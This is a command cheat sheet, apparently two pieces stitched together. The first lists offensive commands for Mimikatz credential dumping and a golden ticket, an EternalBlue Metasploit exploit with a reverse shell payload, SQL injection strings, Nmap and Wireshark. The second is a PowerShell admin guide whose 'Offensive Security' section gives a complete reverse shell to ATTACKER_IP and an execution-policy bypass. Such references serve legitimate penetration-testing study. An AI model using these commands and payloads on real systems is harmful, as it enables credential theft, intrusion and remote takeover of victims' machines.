### 1. Mimikatz Commands
Mimikatz is a tool for extracting credentials from Windows systems. Here are some examples:

#### Extract Logon Passwords
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'
- What it does: Dumps plaintext passwords, hashes, and Kerberos tickets from memory.

#### Extract Kerberos Tickets
Invoke-Mimikatz -Command '"privilege::debug" "kerberos::list"'
- What it does: Lists Kerberos tickets stored in memory.

#### Golden Ticket Attack
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:example.com /sid:S-1-5-21-123456789-1234567890-123456789 /krbtgt:hash /ticket:golden.kirbi"'
- What it does: Creates a "golden ticket" for persistent domain access.

---

### 2. PowerShell Empire Commands
Empire is a post-exploitation framework for PowerShell. Here are some examples:

#### Run a Shell Command
shell whoami
- What it does: Executes a command on the target system (e.g., whoami to check the current user).

#### Download a File
download C:\path\to\file.txt
- What it does: Downloads a file from the target system.

#### Upload a File
upload C:\local\file.txt C:\remote\path\file.txt
- What it does: Uploads a file to the target system.

---

### 3. Metasploit Commands
Metasploit is a penetration testing framework. Here are some examples:

#### Exploit a Vulnerability
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.1
exploit
- What it does: Exploits the EternalBlue vulnerability to gain a Meterpreter shell.

#### Meterpreter Shell Commands
meterpreter > sysinfo
meterpreter > shell
meterpreter > download C:\path\to\file.txt
- What it does: Gathers system info, opens a shell, and downloads files.

---

### 4. Nmap Commands
Nmap is a network scanning tool. Here are some examples:

#### Scan for Open Ports
nmap -sS 192.168.1.1
- What it does: Performs a SYN scan to detect open ports.

#### OS Detection
nmap -O 192.168.1.1
- What it does: Attempts to identify the operating system of the target.

#### Vulnerability Scan
nmap --script vuln 192.168.1.1
- What it does: Runs vulnerability detection scripts against the target.

---

### 5. SQL Injection Commands
SQL injection is a technique for exploiting database vulnerabilities. Here are some examples:

#### Basic SQL Injection
' OR 1=1 --
- What it does: Bypasses authentication by making the query always true.

#### Extract Database Version
' UNION SELECT 1,@@version,3 --
- What it does: Retrieves the database version.

#### Dump Table Data
' UNION SELECT 1,table_name,3 FROM information_schema.tables --
- What it does: Lists all tables in the database.

---

### 6. Wireshark Filters
Wireshark is a network protocol analyzer. Here are some examples:

#### Filter by IP
ip.addr == 192.168.1.1
- What it does: Displays traffic to/from a specific IP.

#### Filter by Protocol
tcp.port == 80
- What it does: Displays HTTP traffic.

#### Filter by Keyword
frame contains "password"
- What it does: Displays packets containing the word "password."

---

### 7. Linux Privilege Escalation
Here are some commands for privilege escalation on Linux systems:

#### Find SUID Files
find / -perm -4000 2>/dev/null
- What it does: Lists files with the SUID bit set (potential privilege escalation targets).



---

### **1. System Information & Management**
#### **Get System Information**  
```powershell
Get-ComputerInfo | Format-List *
```  
- **Purpose**: Retrieves detailed system info (OS version, hardware, BIOS, etc.).

#### **List Running Processes**  
```powershell
Get-Process | Sort-Object CPU -Descending | Format-Table -AutoSize
```  
- **Purpose**: Lists processes sorted by CPU usage.

#### **Check Installed Software**  
```powershell
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher | Format-Table
```  
- **Purpose**: Lists installed software from the registry.

---

### **2. Network & Connectivity**  
#### **Test Connectivity**  
```powershell
Test-NetConnection -ComputerName google.com -Port 443
```  
- **Purpose**: Checks if a remote port (e.g., HTTPS) is open.

#### **Resolve DNS**  
```powershell
Resolve-DnsName -Name example.com -Type A
```  
- **Purpose**: Resolves a domain to its IP address(es).

#### **HTTP Request**  
```powershell
Invoke-WebRequest -Uri "https://api.github.com" | Select-Object -ExpandProperty Content
```  
- **Purpose**: Fetches content from a URL (useful for APIs).

---

### **3. Active Directory (AD) Management**  
#### **List AD Users**  
```powershell
Get-ADUser -Filter * | Select-Object Name, SamAccountName, Enabled
```  
- **Purpose**: Lists all Active Directory users.  
- **Requires**: `ActiveDirectory` module (`Import-Module ActiveDirectory`).

#### **Unlock a User Account**  
```powershell
Unlock-ADAccount -Identity "jdoe"
```  
- **Purpose**: Unlocks a locked AD user account.

#### **Find Inactive Computers**  
```powershell
Search-ADAccount -AccountInactive -ComputersOnly -TimeSpan 90.00:00:00
```  
- **Purpose**: Finds computers inactive for 90+ days.

---

### **4. Security & Auditing**  
#### **Check Firewall Rules**  
```powershell
Get-NetFirewallRule | Where-Object { $_.Enabled -eq 'True' } | Format-Table DisplayName, Direction, Action
```  
- **Purpose**: Lists enabled firewall rules.

#### **Scan for Malware**  
```powershell
Start-MpScan -ScanType FullScan
```  
- **Purpose**: Runs a full Windows Defender scan.  
- **Requires**: Windows Defender module.

#### **List Users with Admin Rights**  
```powershell
Get-LocalGroupMember -Group "Administrators" | Format-Table Name, PrincipalSource
```  
- **Purpose**: Lists all local administrators.

---

### **5. Automation & Scripting**  
#### **Bulk Rename Files**  
```powershell
Get-ChildItem -Path "C:\Reports\*.txt" | Rename-Item -NewName { $_.Name -replace ".txt", "_backup.txt" }
```  
- **Purpose**: Appends "_backup" to all `.txt` files in a folder.

#### **Schedule a Task**  
```powershell
$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-File C:\Scripts\Backup.ps1"
$Trigger = New-ScheduledTaskTrigger -Daily -At 3am
Register-ScheduledTask -TaskName "NightlyBackup" -Action $Action -Trigger $Trigger
```  
- **Purpose**: Schedules a daily PowerShell script to run at 3 AM.

#### **Send Email**  
```powershell
Send-MailMessage -From "alerts@example.com" -To "admin@example.com" -Subject "Alert" -Body "Server down!" -SmtpServer "smtp.example.com" -Port 587 -Credential (Get-Credential)
```  
- **Purpose**: Sends an email via SMTP.

---

### **6. Offensive Security (Ethical Hacking)**  
⚠️ **Use with extreme caution and legal authorization**.  

#### **Dump LSASS Memory (Mimikatz-Style)**  
```powershell
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'
```  
- **Purpose**: Extracts credentials from memory (requires Mimikatz).  

#### **Reverse Shell**  
```powershell
$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP", 4444); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535 | %{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) { $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + "PS " + (pwd).Path + "> "; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte, 0, $sendbyte.Length); $stream.Flush() }; $client.Close()
```  
- **Purpose**: Establishes a reverse shell connection to an attacker’s IP.  

#### **Bypass Execution Policy**  
```powershell
powershell.exe -ExecutionPolicy Bypass -File .\script.ps1
```  
- **Purpose**: Runs a script despite execution policy restrictions.

---

### **7. Advanced PowerShell**  
#### **Create a Custom Module**  
```powershell
# Save this as MyModule.psm1
function Get-HelloWorld { Write-Output "Hello, World!" }
Export-ModuleMember -Function Get-HelloWorld
```  
- **Usage**:  
  ```powershell
  Import-Module .\MyModule.psm1
  Get-HelloWorld
  ```  

#### **Interact with .NET**  
```powershell
[System.Net.Dns]::GetHostAddresses("example.com") | Select-Object IPAddressToString
```  
- **Purpose**: Resolves DNS using .NET classes.

---

### **Best Practices**  
1. **Test in Isolation**: Use virtual machines or sandboxes for risky commands.  
2. **Logging**: Enable PowerShell logging for audits:  
   ```powershell
   Start-Transcript -Path "C:\Logs\PowerShell.log"
   ```  
3. **Sign Scripts**: Digitally sign scripts to ensure integrity.  

